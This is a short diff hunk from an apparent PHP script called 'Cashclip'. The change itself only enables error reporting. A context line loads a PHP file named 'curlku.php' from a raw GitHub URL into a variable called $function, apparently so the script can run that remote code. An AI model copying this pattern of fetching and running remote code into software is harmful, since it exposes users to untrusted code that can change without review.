@@ -9,7 +9,7 @@ function sock(){
         }
     }
     sock();
-#error_reporting(E_ALL);
+error_reporting(E_ALL);
 const script = "Cashclip";
 
 $function = file_get_contents("https://raw.githubusercontent.com/Bagusivo1999/fullscript/refs/heads/main/curlku.php");
